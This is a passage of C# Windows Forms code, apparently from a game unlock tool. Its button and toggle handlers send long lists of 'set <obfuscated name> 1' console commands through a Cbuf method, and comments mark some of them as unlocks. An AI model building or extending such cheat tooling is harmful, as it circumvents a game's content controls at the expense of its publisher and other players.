                    this.Cbuf("set NRMNMOOLSM 1");
                    this.Cbuf("set NQSTORNSRO 1");
                    this.Cbuf("set LPPLOPRQOO 1");
                    this.Cbuf("set MPNKRKSONP 1");
                    this.Cbuf("set LLKTPRPTMO 1");
                    this.Cbuf("set LQTOLLKQSS 1");
                    this.Cbuf("set NNRQTOQSSP 1");
                    this.Cbuf("set LTQRTPPKKS 1");
                    this.Cbuf("set MKNMNRSQRO 1");
                    this.Cbuf("set MLNNMOPQOP 1");
                    this.Cbuf("set NONPSKRPRR 1");
                    this.Cbuf("set TNOQPMNNT 1");
                    this.Cbuf("set LRSRKSSTTK 1");

                }

            }
        }

        private void UnlocksTabPage_Click(object sender, EventArgs e)
        {

        }

        private void richTextBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void guna2ToggleSwitch6_CheckedChanged_1(object sender, EventArgs e)
        {
            {
                {

                    this.Cbuf("set NOPLKRPKQL 1");

                }

            }
        }

        private void guna2ToggleSwitch19_CheckedChanged_2(object sender, EventArgs e)
        {
            this.Cbuf("set NKSTOOTSMO 1");
            this.Cbuf("set MSROMLONNT 1");
            this.Cbuf("set TORMQRSOS 1");
            this.Cbuf("set LNORNRSRLR 1");
            this.Cbuf("set LROKLTPMOM 1");
            this.Cbuf("set NNMMRMNMNQ 1");
            this.Cbuf("set NQTSMTPTMS 1");
            this.Cbuf("set NQROMTQPMT 1");
            this.Cbuf("set LMKMRSPR 1");
            this.Cbuf("set LPOOMOLLRQ 1");
            this.Cbuf("set LNTOKPTKS 1");
            this.Cbuf("set NRTLNOPOSM 1");
        }

        private void guna2ToggleSwitch19_CheckedChanged_3(object sender, EventArgs e)
        {
            {
                {
                    this.Cbuf("set LSOLLKOPQT 1");
                    this.Cbuf("set NRTSOTKTOS 1");
                    this.Cbuf("set NMKTMRRMKN 1");
                    this.Cbuf("set OROLLTLOO 1");
                    this.Cbuf("set MNNMKSKTR 1");
                    this.Cbuf("set LRRRTTOSSK 1");
                    this.Cbuf("set NOPMMKMQTP 1");
                    this.Cbuf("set LOTTMONMPO 1");
                }

            }
        }

        private void guna2ToggleSwitch20_CheckedChanged_1(object sender, EventArgs e)
        {
            {
                {

                    this.Cbuf("set NRMNMOOLSM 1");
                    this.Cbuf("set NQSTORNSRO 1");
                    this.Cbuf("set LPPLOPRQOO 1");
                    this.Cbuf("set MPNKRKSONP 1");
                    this.Cbuf("set LLKTPRPTMO 1");
                    this.Cbuf("set LQTOLLKQSS 1");


                }

            }
        }

        private void guna2ToggleSwitch28_CheckedChanged_1(object sender, EventArgs e)
        {
            this.Cbuf("set NNRQTOQSSP 1");
            this.Cbuf("set LTQRTPPKKS 1");
            this.Cbuf("set MKNMNRSQRO 1");
            this.Cbuf("set MLNNMOPQOP 1");
            this.Cbuf("set NONPSKRPRR 1");
            this.Cbuf("set TNOQPMNNT 1");
            this.Cbuf("set LRSRKSSTTK 1");
        }



        private void guna2ToggleSwitch29_CheckedChanged_1(object sender, EventArgs e)
        {

            {

                this.Cbuf("set MRRPNNKKPO 1");
                this.Cbuf("set LKQKPMMRLK 1");
            }

        }

        private void guna2ToggleSwitch19_CheckedChanged_4(object sender, EventArgs e)
        {
            {
                {
                    this.Cbuf("set MQMRPPKMK 1");
                    this.Cbuf("set NSNLRONNTR 1");
                    this.Cbuf("set MRKOMSNLRK 1");
                }

            }
        }

        private void guna2ToggleSwitch28_CheckedChanged_2(object sender, EventArgs e)
        {

        }

        private void guna2ToggleSwitch4_CheckedChanged_3(object sender, EventArgs e)
        {
            {
                this.Cbuf("set MQMRPPKMK 1");

            }
        }

        private void guna2ToggleSwitch20_CheckedChanged_2(object sender, EventArgs e)
        {
            this.Cbuf("set NSNLRONNTR 1");

        }

        private void guna2ToggleSwitch5_CheckedChanged_2(object sender, EventArgs e)
        {
            this.Cbuf("set MRKOMSNLRK 1");
        }

        private void metroButton10_Click(object sender, EventArgs e)
        {
            {

                this.Cbuf("set TMRMQSTK 1");
                this.Cbuf("set LTOKSMSMQQ 1");
                this.Cbuf("set LOOKTNMOSQ 1");
                this.Cbuf("set QRLMQMNSQ 1");
                this.Cbuf("set MLPMPKMMKO 1");
                this.Cbuf("set LPMMSLRTPL 1");
                this.Cbuf("set MQPKNLOSRS 1");
                this.Cbuf("set LQQNNTTOTP 1");
                this.Cbuf("set LNOMMLLPMR 1");
                this.Cbuf("set SMOLKMMPM 1");
                this.Cbuf("set OMPNPQLLMP 1");
                this.Cbuf("set MSQROKTRSN 1");
                this.Cbuf("set LLQTQTNMTK 1");
                this.Cbuf("set ROLQKTOMM 1");
                this.Cbuf("set MKPKSTLTTT 1");
                this.Cbuf("set MMLSQKRSST 1");
                this.Cbuf("set OOTRPMPKP 1");
                this.Cbuf("set ROQSKRSPL 1");
                this.Cbuf("set MNQNRQRKQM 1");
                this.Cbuf("set PQSRTPQP 1");
                this.Cbuf("NNOTOOSNQR 1");//QMRSMTKKS unlocks

            }
        }

        private void metroButton4_Click_2(object sender, EventArgs e)
        {
            {
                {

                    this.Cbuf("set NMNLLPPPPT 1");
                    this.Cbuf("set NNLOSMSLOM 1");
                    this.Cbuf("set MKRTMTSMRP 1");
                    this.Cbuf("set NTKPQTSSLQ 1");
                    this.Cbuf("set TTMRSTRO 1");
                    this.Cbuf("set NPSPRQNQRN 1");
                    this.Cbuf("set LQMTORORON 1");
                    this.Cbuf("set PPKQNKNMN 1");
                    this.Cbuf("set MKOPSKQQPK 1");
                    this.Cbuf("set MKOSOKPQPP 1");
                    this.Cbuf("set NRRKTNSKKT 1");
                    this.Cbuf("set NKMMPQNKOK 1");
                    this.Cbuf("set GLNLRQKMPKS 1");
                    this.Cbuf("set LKLQPTQLQL 1");
                    this.Cbuf("set NLQNMMPMP 1");
                    this.Cbuf("set MSPKRKOSMK 1");
                    this.Cbuf("set LNNONMKKLR 1");
                    this.Cbuf("set LSONQSQRTO 1");
                    this.Cbuf("set QQPPQOOMK 1");
                    this.Cbuf("set NTSKRKRTTO 1");
                    this.Cbuf("set MRSSTQPRT 1");
                    this.Cbuf("set MMNMNMQQT 1");
                    this.Cbuf("set NKMNTQORSL 1");
                    this.Cbuf("set NPLRLMRLOS 1");
                    this.Cbuf("set OLKMSPPNPQ 1");
                    this.Cbuf("set LKLMPOLMKL 1");
                    this.Cbuf("set NTSLLQMPL 1");
                    this.Cbuf("set MPLMRNSMPQ 1");
                    this.Cbuf("NNOTOOSNQR 1");//QMRSMTKKS unlocks

                }
            }
        }

        private void metroButton5_Click_1(object sender, EventArgs e)
        {
            {

                this.Cbuf("set NKRRQNRKLN 1");
                this.Cbuf("set NQTRTRPSMS 1");
                this.Cbuf("set QKNTLMSO 1");
                this.Cbuf("set LMSMQKKTSS 1");
                this.Cbuf("set LQSQKNPKSL 1");
                this.Cbuf("set MMKNMRQNML 1");
                this.Cbuf("set OKPSNSLORO 1");
                this.Cbuf("set MLOQKKOMLR 1");
                this.Cbuf("set NTKKRRKRNQ 1");
                this.Cbuf("set TRMQNQQNT 1");
            }
        }

        private void metroButton6_Click_1(object sender, EventArgs e)
        {
            {
                this.Cbuf("set FCIEJBIHA 1");
                this.Cbuf("set ECFHGIGFCI 1");
                this.Cbuf("set CCCCGJJHFB 1");
                this.Cbuf("set DIAIDJECHF 1");
                this.Cbuf("set EACHICHBCD 1");
                this.Cbuf("set BJEDCJAEHH 1");
                this.Cbuf("set BAHJDDBGHC 1");
                this.Cbuf("set DEABDIJFCA 1");
                this.Cbuf("set DIIAFCGBDA 1");
                this.Cbuf("set CEAEFCAGJG 1");
                this.Cbuf("set BCFDGFIAII 1");
                this.Cbuf("set CHACGEJGIH 1");
                this.Cbuf("set BJBBFIGDGI 1");
                this.Cbuf("set HHGGGGB 1");
                this.Cbuf("set CDDBGABEGI 1");
                this.Cbuf("set DAIACGBAGD 1");
                this.Cbuf("set DHIADABBII 1");
                this.Cbuf("set DAFJHJCCGG 1");
                this.Cbuf("set EBBGDFJAAF 1");
                this.Cbuf("set FHEGBGHEC 1");
                this.Cbuf("set BHEFHGDGAD 1");
                this.Cbuf("set DGEJEAHEGH 1");
                this.Cbuf("set CDDHABCDHI 1");
                this.Cbuf("set BIAJAECICH 1");
                this.Cbuf("set DGAIDIEIAC 1");
                this.Cbuf("set CIHFHAIIHC 1");
                this.Cbuf("set DIHECGBHBG 1");
                this.Cbuf("set CIHDBEDCJE 1");
                this.Cbuf("set DCIDFCJAEI 1");
                this.Cbuf("set BHFDJFGJHD 1");
                this.Cbuf("set BHBHCBJACC 1");
                this.Cbuf("set BIHEJBBCDH 1");
                this.Cbuf("set CGDDJJFGII 1");
                this.Cbuf("set CAHFBHBEBB 1");
                this.Cbuf("set DAGCEEFBBI 1");
                this.Cbuf("set BDGIEFCCJE 1");
                this.Cbuf("set ECADDGAFF 1");
                this.Cbuf("set EBHGFCEEDG 1");
                this.Cbuf("set CCBABDAGGJ 1");
                this.Cbuf("set BGGFCBBEC 1");
                this.Cbuf("set HHFCGDBEE 1");
                this.Cbuf("set DCHCGDJCGB 1");
                this.Cbuf("set CGJHAIGFAE 1");
                this.Cbuf("set DHHHJGGFJG 1");
                this.Cbuf("set CEEHHDEHJB 1");
                this.Cbuf("set EHGDEAAICJ 1");
                this.Cbuf("set GHIJIIFEJ 1");
                this.Cbuf("set BCDJIEIDID 1");
                this.Cbuf("set DJEIAJCAD 1");
                this.Cbuf("set BAGCIGCDIJ 1");
                this.Cbuf("set CJHFBEFDI 1");
                this.Cbuf("set ECHGADJJIE 1");
                this.Cbuf("set DDGIGAGHC 1");
                this.Cbuf("set CFDEEHJBFJ 1");
                this.Cbuf("set BAJIADIDFC 1");
                this.Cbuf("set HCAFBJBHC 1");
                this.Cbuf("set DGCCJECGEJ 1");
                this.Cbuf("set CEHDAACIJA 1");
                this.Cbuf("NNOTOOSNQR 1");//QMRSMTKKS unlocks

            }
        }

        private void groupBox9_Enter(object sender, EventArgs e)
        {

        }

        private void metroButton14_Click(object sender, EventArgs e)
        {
            {
                this.Cbuf("set DCBAIHDCFC 1");
                this.Cbuf("set EAGGAEGHHA 1");
                this.Cbuf("set BICHFDHCCB 1");
                this.Cbuf("set CBEFBFCHHA 1");
                this.Cbuf("set CDGCBCBAJ 1");
                this.Cbuf("set EAIEFBHGJ 1");
                this.Cbuf("set BIIBDBAHD 1");
                this.Cbuf("set EAFIEFBJFG 1");
                this.Cbuf("set BAJHDFAJJF 1");
                this.Cbuf("set DCEDEGBFEJ 1");
                this.Cbuf("set CDFCHEJJE 1");
                this.Cbuf("set EEDIGBACC 1");
                this.Cbuf("set CAGFFJDHFJ 1");
                this.Cbuf("set BEJHAIFIAB 1");
                this.Cbuf("set CGCGHIJDFF 1");
                this.Cbuf("set BJCBCCBJIE 1");
                this.Cbuf("set DEHEEEBGAE 1");
                this.Cbuf("set BBHAECABBD 1");
                this.Cbuf("set DDJDHHCJG 1");
                this.Cbuf("set BHHJBIJAAD 1");
                this.Cbuf("set GCCHFDJAF 1");
                this.Cbuf("set DCAFDBDGGA 1");
                this.Cbuf("set CIIBCJJCIB 1");
                this.Cbuf("set FDBGHIFEE 1");
                this.Cbuf("set HABIAFADE 1");
                this.Cbuf("set CBCIHEGADA 1");
                this.Cbuf("set IGAJBFHE 1");
                this.Cbuf("set DBEGFBHAIH 1");
                this.Cbuf("set CADJGGAAGJ 1");
                this.Cbuf("set BCAGJEDAEG 1");
                this.Cbuf("set DIEEIEFCFF 1");
                this.Cbuf("set CFGCDIGFIE 1");
                this.Cbuf("set FAHJIEFAH 1");
                this.Cbuf("set CCBGEJDJJ 1");
                this.Cbuf("set BBGGBGEHAI 1");
                this.Cbuf("set DHCFHGIABE 1");
                this.Cbuf("set BGGEEHBDEI 1");
                this.Cbuf("set BEAJHICIEF 1");
                this.Cbuf("set BABCCCHFBJ 1");
                this.Cbuf("set IEJEJEI 1");
                this.Cbuf("set BEHFHDEBDG 1");
                this.Cbuf("set DFBAEGIJIE 1");
                this.Cbuf("set BBFCJEFFAH 1");
                this.Cbuf("set EBCDCFCBE 1");
                this.Cbuf("set BDDFBGGBDC 1");
                this.Cbuf("set DDAEJCJEA 1");
                this.Cbuf("set CADJIDDGA 1");
                this.Cbuf("set BCDJIEIDID 1");
                this.Cbuf("NNOTOOSNQR 1");//QMRSMTKKS unlocks

            }
        }



        private void metroButton13_Click_1(object sender, EventArgs e)
        {
            this.Cbuf("set MKLMLMSPRS 1");
            this.Cbuf("set MTLOMKKRPT 1");
            this.Cbuf("set TMLRPNPMM 1");
            this.Cbuf("set MSNNNKTSPL 1");
            this.Cbuf("set LLMRNPOTTL 1");
            this.Cbuf("set MSNNNKTSPL 1");
            this.Cbuf("set LLMRNPOTTL 1");
            this.Cbuf("set NRPPMSKMTL 1");
            this.Cbuf("set LTLNLQPSSL 1");
            this.Cbuf("set MOLQOSKTOS 1");
            this.Cbuf("set NKRRQNRKLN 1");
            this.Cbuf("set NQTRTRPSMS 1");
            this.Cbuf("set QKNTLMSO 1");
            this.Cbuf("set LMSMQKKTSS 1");
            this.Cbuf("set LQSQKNPKSL 1");
            this.Cbuf("set MMKNMRQNML 1");
            this.Cbuf("set OKPSNSLORO 1");
            this.Cbuf("set MLOQKKOMLR 1");
            this.Cbuf("set NTKKRRKRNQ 1");
            this.Cbuf("set TRMQNQQNT 1");
            this.Cbuf("set MTMOLSNRTK 1");
            this.Cbuf("set OLQTKKONKT 1");
            this.Cbuf("set NQLOTSRTQR 1");
            this.Cbuf("set LQQMNNQPON 1");
            this.Cbuf("set MQMRKTQPKL 1");
            this.Cbuf("set MOPMOKNOQS 1");
            this.Cbuf("set LQNPSOKKQT 1");
            this.Cbuf("set NKLQKPPOMR 1");
            this.Cbuf("set NNSQSMTQPP 1");
            this.Cbuf("set NTKRPRKMOK 1");
            this.Cbuf("set SNMKKNPTQ 1");
            this.Cbuf("set CNQKSNKRLPS 1");
            this.Cbuf("set OMQTQNOSRO 1");
            this.Cbuf("set NSRPORKNPT 1");
            this.Cbuf("set TMRKMSSMK 1");
            this.Cbuf("set LKKKQSOPSP 1");
            this.Cbuf("set NTOQQKQLTS 1");
            this.Cbuf("set OLSOSNTLMP 1");
        }

        private void metroButton11_Click(object sender, EventArgs e)
        {
            {

                this.Cbuf("set SNMKKNPTQ 1");
                this.Cbuf("set CNQKSNKRLPS 1");
                this.Cbuf("set OMQTQNOSRO 1");
                this.Cbuf("set NSRPORKNPT 1");
                this.Cbuf("set TMRKMSSMK 1");
                this.Cbuf("set LKKKQSOPSP 1");
                this.Cbuf("set NTOQQKQLTS 1");
                this.Cbuf("set OLSOSNTLMP 1");
            }
        }

        private void metroButton15_Click(object sender, EventArgs e)
        {

            this.Cbuf("set NNSQSMTQPP 1");
            this.Cbuf("set NTKRPRKMOK 1");
            this.Cbuf("set MOPMOKNOQS 1");
            this.Cbuf("set LQNPSOKKQT 1");
            this.Cbuf("set NKLQKPPOMR 1");
            this.Cbuf("set MTMOLSNRTK 1");
            this.Cbuf("set OLQTKKONKT 1");
            this.Cbuf("set NQLOTSRTQR 1");
            this.Cbuf("set LQQMNNQPON 1");
            this.Cbuf("set MQMRKTQPKL 1");
        }

        private void metroButton16_Click(object sender, EventArgs e)
        {
            this.Cbuf("set MKLMLMSPRS 1");
            this.Cbuf("set MTLOMKKRPT 1");
            this.Cbuf("set TMLRPNPMM 1");
            this.Cbuf("set MSNNNKTSPL 1");
            this.Cbuf("set LLMRNPOTTL 1");
            this.Cbuf("set MSNNNKTSPL 1");
            this.Cbuf("set LLMRNPOTTL 1");
            this.Cbuf("set NRPPMSKMTL 1");
            this.Cbuf("set LTLNLQPSSL 1");
            this.Cbuf("set MOLQOSKTOS 1");
        }

        private void metroButton17_Click(object sender, EventArgs e)
        {
            this.Cbuf("set NMOLNNPOST 1");
            this.Cbuf("set LKPLLLNTNS 1");
            this.Cbuf("set OSONRTTPO 1");
            this.Cbuf("set MSKKKMTQNT 1");
            this.Cbuf("set MMPQRNNTSO 1");
            this.Cbuf("set MSPQRMTSTS 1");
            this.Cbuf("set LQQKKSNPNS 1");
            this.Cbuf("set SKKNQTSPT 1");
            this.Cbuf("set MPRRTSLLNL 1");
            this.Cbuf("set OMONSMLKMN 1");
            this.Cbuf("set NLNMRQRSP 1");
            this.Cbuf("set LRTMQRTPLO 1");
            this.Cbuf("set MPQSQTNRNO 1");
            this.Cbuf("set NSPSRQONRN 1");
            this.Cbuf("set LNKRTSKLT 1");
        }

        private void metroButton18_Click(object sender, EventArgs e)
        {

          
           
            
           
           
            this.Cbuf("set NNMQOSNQLP 1");
        }

        private void metroButton19_Click(object sender, EventArgs e)
        {

            this.Cbuf("set LQKPOSTSMP 1");
            this.Cbuf("set MLRONRKSOQ 1");
            this.Cbuf("set LMSLNRLNOT 1");
            this.Cbuf("set NMQNRSMLSL 1");
            this.Cbuf("set TLOLPTLNQ 1");
            this.Cbuf("set MSQLPLNSQN 1");
            this.Cbuf("set MSLTMOPNPN 1");
            this.Cbuf("set LLMMMMLOOO 1");
            this.Cbuf("set NOPOLMQKPL 1");
            this.Cbuf("set NPQTQQNORO 1");
            this.Cbuf("set LKKOOLRTTL 1");
            this.Cbuf("set MKNLOLTLTR 1");
            this.Cbuf("set NSNPRRQTOP 1");
        }

        private void metroButton20_Click(object sender, EventArgs e)
        {
            this.Cbuf("set MSTLNMPLSN 1");
            this.Cbuf("set LNKPRSTSOL 1");
            this.Cbuf("set NPPRNLKOMQ 1");
            this.Cbuf("set TNTQTRLPO 1");
            this.Cbuf("set OKSMMNSQRQ 1");
            this.Cbuf("set LSKMQKNNTS 1");
            this.Cbuf("set OKONNRRSLL 1");
            this.Cbuf("set NOKQPMTLKO 1");
            this.Cbuf("set NRTQMKSPTS 1");
            this.Cbuf("set PRRPMPQOT 1");
            this.Cbuf("set RSLPNPON 1");
            this.Cbuf("set LNRQMSLQT 1");
            this.Cbuf("set MMMPOKRSML 1");
            this.Cbuf("set MQRSQKTLON 1");
            this.Cbuf("set LTPPTQSOKK 1");
        }

        private void groupBox10_Enter(object sender, EventArgs e)
        {

        }

        private void metroButton6_Click_2(object sender, EventArgs e)
        {
            
            this.Cbuf("set BJCFFHAIFA 1");
            this.Cbuf("set BJBBFFIFAC 1");
            this.Cbuf("set BAAABFICDA 1");
            this.Cbuf("set ECHHDAIBD 1");
            this.Cbuf("set CJEBHGIHFC 1");
            this.Cbuf("set CEHADFDEHG 1");
            this.Cbuf("set DEAJJIDDHJ 1");
            this.Cbuf("set BHEFDBJAAF 1");
            this.Cbuf("set DHEBBIJFDF 1");
            this.Cbuf("set CDEBADHJJF 1");
            this.Cbuf("set BECFECEHDB 1");
            this.Cbuf("set BIGJIJCGCE 1");
            this.Cbuf("set HGJFFDFCE 1");
            this.Cbuf("set CDIHEFEJB 1");
            this.Cbuf("set DFBHAJECAH 1");
            this.Cbuf("set DDHICDBBDI 1");
            this.Cbuf("set CGABICJHAI 1");
            this.Cbuf("set DBDHEJCHCI 1");
            this.Cbuf("set DBEGJIECGB 1");
            this.Cbuf("set CEABIIIID 1");
            this.Cbuf("set BDEFICGGII 1");
            this.Cbuf("set CBHIFDJIJC 1");
            this.Cbuf("set DJDAJBFCEE 1");
            this.Cbuf("set DIHFEBAJJD 1");
            this.Cbuf("set CBFABAEHIH 1");
            this.Cbuf("set CHIGGDJFGJ 1");
            this.Cbuf("set BDFFDJAHBF 1");
            this.Cbuf("set DIDCHDDFBH 1");
            this.Cbuf("set DHFCHIIJCA 1");
            this.Cbuf("set BFBIAHJJFA 1");
            this.Cbuf("set BEFACAIFDD 1");
            this.Cbuf("set EAIBAGFDCD 1");
            this.Cbuf("set BHDGBCBHJD 1");
            this.Cbuf("set BHGDCCDDEF 1");
            this.Cbuf("set CFEAGBEAHD 1");
            this.Cbuf("set BEBGCCIEG 1");
            this.Cbuf("set BHEDIECCBD 1");
            this.Cbuf("set DBEFJGAEFA 1");
            this.Cbuf("set CFBBHFFBH 1");
            this.Cbuf("set DADEIIEEEB 1");
            this.Cbuf("set JIGEGGGJB 1");
            this.Cbuf("set CIJBCECDAG 1");
            this.Cbuf("set BCIEFAHEIJ 1");
            this.Cbuf("set CHDGGCCHC 1");
            this.Cbuf("set DBFCJBDJEC 1");
            this.Cbuf("set BHHAAHFCFC 1");
            this.Cbuf("set CIGHGHEJHH 1");
            this.Cbuf("set DDCJCCJCBA 1");
            this.Cbuf("set ECFAHGIBIE 1");
            this.Cbuf("set DIJFGHFJEJ 1");
            this.Cbuf("set DJGJIJCACA 1");
            this.Cbuf("set CGIDDGHJDC 1");
            this.Cbuf("set BHBBJDEAC 1");
            this.Cbuf("set BECCFCBIAA 1");

        }

        private void metroButton12_Click(object sender, EventArgs e)
        {
            this.Cbuf("set BIGIHAGAAA 1");
            this.Cbuf("set BGDAJBJBFF 1");
            this.Cbuf("set BBBFCJBBJD 1");
            this.Cbuf("set EBHIFJCGBH 1");
            this.Cbuf("set CGEHBDEEJE 1");
            this.Cbuf("set ECAJCAJJGF 1");
            this.Cbuf("set DDEJECEIBB 1");
            this.Cbuf("set CFBGJIFDIF 1");
            this.Cbuf("set CFCAICIAJC 1");
            this.Cbuf("set CCDGAGCFGE 1");
            this.Cbuf("set CGEIBHCJF 1");
            this.Cbuf("set CJFDFGGBEJ 1");
            this.Cbuf("set BIJBCEGDDF 1");
            this.Cbuf("set CHHAJDBFDA 1");
            this.Cbuf("set DFJDIFJEGA 1");
            this.Cbuf("set FJDFFHJA 1");
            this.Cbuf("set JJGBIGCCJ 1");
            this.Cbuf("set JCBDICCAH 1");
            this.Cbuf("set EBCIHGAFBB 1");
            this.Cbuf("set CHAHCCAJEB 1");
            this.Cbuf("set CBFHIIHAGH 1");
            this.Cbuf("set IDHBHGDFE 1");
        }

        private void metroButton14_Click_1(object sender, EventArgs e)
        {
            this.Cbuf("set EIBEJCIJ 1");
            this.Cbuf("set CEJJDJJHIJ 1");
            this.Cbuf("set DBFFAEEFGJ 1");
            this.Cbuf("set BEGIJHBHFC 1");
            this.Cbuf("set DDGGFAEGID 1");
            this.Cbuf("set CBGBBHHIJE 1");
            this.Cbuf("set CCFIBGGCBE 1");
            this.Cbuf("set CJEHADCJDB 1");
            this.Cbuf("set DGGGEGCC 1");
            this.Cbuf("set GEGAFIFFC 1");
            this.Cbuf("set EDFJDAHID 1");
            this.Cbuf("set CEGDBDIIIE 1");
            this.Cbuf("set DAGGACDJBE 1");
            this.Cbuf("set CDIHDAEIJI 1");
            this.Cbuf("set CIGFFEAEFD 1");
            this.Cbuf("set CJCDDGBHJI 1");
            this.Cbuf("set BBIDIHBAEG 1");
            this.Cbuf("set CEIHBEDEDE 1");
            this.Cbuf("set CEGEEHGGBA 1");
            this.Cbuf("set DFGAIDGFJC 1");
            this.Cbuf("set BEICCJHHAH 1");
            this.Cbuf("set BCEHEAHAHI 1");
            this.Cbuf("set BGHCDBAGFB 1");
            this.Cbuf("set IFJCDCCAI 1");
        }

        private void metroButton26_Click(object sender, EventArgs e)
        {
           
            this.Cbuf("set BGCHIICIHA 1");
            this.Cbuf("set ECACFHAEFG 1");
            this.Cbuf("set BHECIAHGC 1");
            this.Cbuf("set EAGBECEBGA 1");
            this.Cbuf("set DCFIDJGACA 1");
            this.Cbuf("set FFFHHEJDI 1");
            this.Cbuf("set DACCIAAAAB1");
            this.Cbuf("set CIHEHBHFI 1");
            this.Cbuf("set BHCCFDDEHE 1");
            this.Cbuf("set BFJHDDEJJG 1");
            this.Cbuf("set GAIIBGBDJ 1");
            this.Cbuf("set EBGJFFIAGG 1");
            this.Cbuf("set DCEFDHHFGD 1");
            this.Cbuf("set GDEGAIEID 1");
            this.Cbuf("set BGIDADECDJ 1");
            this.Cbuf("set BFDEDEGDFD 1");
            this.Cbuf("set CGGHDFIDAF 1");
            this.Cbuf("set BAFCBFEHG 1");
            this.Cbuf("set CADCJCJEE 1");
            this.Cbuf("set CCEJJCCDEG 1");
            this.Cbuf("set BGIAICIDDI 1");
            this.Cbuf("set DDBFFCFJJJ 1");
            this.Cbuf("set DGGIJADHJI 1");
            this.Cbuf("set DJAFAHJFED 1");
            this.Cbuf("set BEGFEIBDFF 1");
            this.Cbuf("set DEFGJFEHJJ 1");
            this.Cbuf("set DDICCGJBEA 1");
            this.Cbuf("set EAHDDEACBE 1");
            this.Cbuf("set BBEEIGHJBA 1");
            this.Cbuf("set EGIICJGCF 1");
            this.Cbuf("set DFBEIBEAF 1");
            this.Cbuf("set CIDEADAABH 1");
            this.Cbuf("set EBEAGCDEJ 1");
            this.Cbuf("set FHGJJIEHA 1");
            this.Cbuf("set BFHCBIBDGH 1");
            this.Cbuf("set DFDDHFFJF 1");
            this.Cbuf("set BCDHJIHBAA 1");
            this.Cbuf("set CEIBACCEAF 1");
            this.Cbuf("set CFHHBHFCCA 1");
            this.Cbuf("set BJCDJGCFJJ 1");
            this.Cbuf("set EAAAGHFJCB 1");
            this.Cbuf("set DGEJJACHHF 1");
            this.Cbuf("set EFCHBAIF 1");
            this.Cbuf("set DBJJEJEAIA 1");
            this.Cbuf("set DDHHJJHBGC 1");
            this.Cbuf("set BEFHEEBHIA 1");
            this.Cbuf("set BAFIABHBHG 1");
            this.Cbuf("set BAIICCCCAG 1");
            this.Cbuf("set BGDGIHFHEF 1");
            this.Cbuf("set BGGADJCCDE 1");
            this.Cbuf("set BJDGHFDHC 1");
            this.Cbuf("set BAHGDJFBEF 1");
            this.Cbuf("set DIGGBDJIIE 1");
            this.Cbuf("set DCIFIBDGFI 1");
            this.Cbuf("set CAAEDJHHH 1");
            this.Cbuf("set CBCJDCHCCD 1");
            this.Cbuf("set DGJAJJJHGF 1");
            this.Cbuf("set BFEIEEBFJG 1");
            this.Cbuf("set DJIFJCHEBE 1");
            this.Cbuf("set CAGHCEACAD 1");
            this.Cbuf("set CGDBJBGBHI 1");
            this.Cbuf("set BIBHHEJBIB 1");
            this.Cbuf("set DCCBEAGDJE 1");
            this.Cbuf("set DJGEFDIGIC 1");
            this.Cbuf("set EBHBCGHBJ 1");
            this.Cbuf("set HDABBHBEH 1");
            this.Cbuf("set DCJHCAFIIA 1");
            this.Cbuf("set BHEJAGFIBB 1");
            this.Cbuf("set DIHBAJHIGG 1");
            this.Cbuf("set BIAEDEEBJI 1");
            this.Cbuf("set CFFFHJHGAA 1");
            this.Cbuf("set JDFEBBHGH 1");
        }

        private void metroButton22_Click(object sender, EventArgs e)
        {
           
           
            this.Cbuf("set MMTSOPMLPR 1");
            this.Cbuf("set LLSNLQLRMN 1");
            this.Cbuf("set LPOPSSSNMK 1");
            this.Cbuf("set LQNORLOQNM 1");
            this.Cbuf("set ORTSSLPSK 1");
            this.Cbuf("set MKQMOQMNNR 1");
            this.Cbuf("set MMNQSMKTOQ 1");
            this.Cbuf("set LSNNTTKSTR 1");
            this.Cbuf("set MPKRNORPS 1");
            this.Cbuf("set NPRKKSMKOQ 1");
            this.Cbuf("set NPLPQTQRSP 1");
            this.Cbuf("set OPPKROMLS 1");
            this.Cbuf("set NQTSLKSSTL 1");
            this.Cbuf("set LORPPQRPNS 1");
            this.Cbuf("set OKNQOORNNM 1");
            this.Cbuf("set LTSLNQNOSN 1");
            this.Cbuf("set MSKRLSSSN 1");
            this.Cbuf("set QMSNKLSNK 1");
            this.Cbuf("set MONTSOTSQO 1");
            this.Cbuf("set LSQTPPQRSK 1");
            this.Cbuf("set MQOPMONST 1");
            this.Cbuf("set MSMQPLLMNS 1");
            this.Cbuf("set NKMKOSNOOL 1");
            this.Cbuf("set NRONRSORPQ 1");
        }

        private void metroButton23_Click(object sender, EventArgs e)
        {
            this.Cbuf("set CHCAFBBGGD 1");
            this.Cbuf("set BAGGCHDDCD 1");
            this.Cbuf("set IJEBHJIJF 1");
            this.Cbuf("set HDDHJIBDH 1");
            this.Cbuf("set BCIDHGBGDC 1");
            this.Cbuf("set CGHHDHCDEC 1");
            this.Cbuf("set DHDFAFJJBD 1");
            this.Cbuf("set BCECADEHDA 1");
            this.Cbuf("set GFHEFICGF1");
            this.Cbuf("set BACCCIHGDG 1");
            this.Cbuf("set BBFJEGIJIA 1");
            this.Cbuf("set DJCDIBBDGH 1");
            this.Cbuf("set ECGBJEGHJG 1");
            this.Cbuf("set BHFBBEBFBE 1");
            this.Cbuf("set CFJACGBBII 1");
            this.Cbuf("set CDFHJHDEFC 1");
            this.Cbuf("set FBFFEFEGB 1");
            this.Cbuf("set EEHHCFBGC 1");
            this.Cbuf("set CIGGHDDHGJ 1");
            this.Cbuf("set CAFIEFFIHF 1");
            this.Cbuf("set JEJDGCEIJ 1");
            this.Cbuf("set CIIGICAIFC 1");
            this.Cbuf("set CJIAHJHHDJ 1");
            this.Cbuf("set EHBHDBFHE 1");
            this.Cbuf("set BGJDFBGDHF 1");
            this.Cbuf("set EBCDFHECAC 1");
            this.Cbuf("set EBCDFHECAC 1");
            this.Cbuf("set BHHEFDJCBF 1");
            this.Cbuf("set DIJDDGHHFE 1");
            this.Cbuf("set BAGAFBABEE 1");
            this.Cbuf("set BGHJAGAJAB 1");
            this.Cbuf("set DADCAIEEDE 1");
            this.Cbuf("set EBIDFIDHIE 1");
            this.Cbuf("set DEGABDJDH 1");
            this.Cbuf("set CIAGIFEAIC 1");
            this.Cbuf("set CJBCJBAIAF 1");
            this.Cbuf("set DIDICJHGG 1");
            this.Cbuf("set BDJHIJJHGG 1");
            this.Cbuf("set GGFCHCDDE 1");
            this.Cbuf("set FBJHBCEGC 1");
            this.Cbuf("set BGEFGFACEH 1");
            this.Cbuf("set EAHBDIJIGF 1");
            this.Cbuf("set DDHAAEGIEI 1");
            this.Cbuf("set BGBCGJGJFJ 1");
            this.Cbuf("set DBAJHJAHCA 1");
            this.Cbuf("set EJJEHHFCC 1");
